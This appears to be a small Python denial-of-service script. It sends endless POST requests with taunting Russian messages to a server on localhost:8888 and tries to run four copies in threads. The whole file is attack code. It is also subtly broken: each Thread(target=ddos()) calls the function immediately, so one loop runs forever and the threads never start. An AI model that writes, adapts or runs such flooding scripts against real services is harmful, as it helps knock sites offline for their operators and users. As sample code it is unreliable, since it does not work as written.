import requests
from threading import Thread

def ddos():
    while True:
        data = {
            "title": "Это Дудос детка",
            "text": "ты ничего не сделаешь"
        }
        requests.post("http://localhost:8888/", data)

thread1 = Thread(target=ddos())
thread2 = Thread(target=ddos())
thread3 = Thread(target=ddos())
thread4 = Thread(target=ddos())

thread1.start()
thread2.start()
thread3.start()
thread4.start()